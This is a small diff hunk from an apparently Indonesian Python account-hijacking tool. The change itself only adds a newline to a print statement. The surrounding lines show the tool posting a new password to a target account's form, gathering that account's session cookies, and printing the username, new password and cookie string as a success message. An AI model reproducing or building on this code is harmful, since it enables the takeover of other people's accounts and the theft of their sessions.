@@ -130,4 +130,4 @@ class Eksekusi(Main):
 			dat2.update({"password_new":"".join(pwBaru)})
 			an=session.post(self.url+link3.get("action"),data=dat2)
 			coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-			print(f"\r[√] Akun tap yes\n[=] Password diubah!\n[=] {self.user} | {''.join(pwBaru)}\n[=] Cookie: {coki}							\n",end="")
+			print(f"\r[√] Akun tap yes\n[=] Password diubah!\n[=] {self.user} | {''.join(pwBaru)}\n[=] Cookie: {coki}							\n\n",end="")
